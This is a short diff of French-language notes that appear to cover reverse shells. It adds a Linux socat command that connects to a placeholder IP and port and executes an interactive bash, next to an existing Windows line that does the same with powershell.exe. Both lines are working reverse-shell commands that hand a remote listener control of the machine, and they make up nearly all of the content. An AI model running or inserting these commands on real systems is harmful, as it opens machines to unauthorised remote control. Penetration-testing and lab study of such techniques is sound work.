@@ -26,5 +26,8 @@ PS C:\Users\user> socat TCP:<NOTRE-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 2) Sur une machine linux
 
 ```shell
-
+user@raspberrypi: ~$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 ```
+
+
+
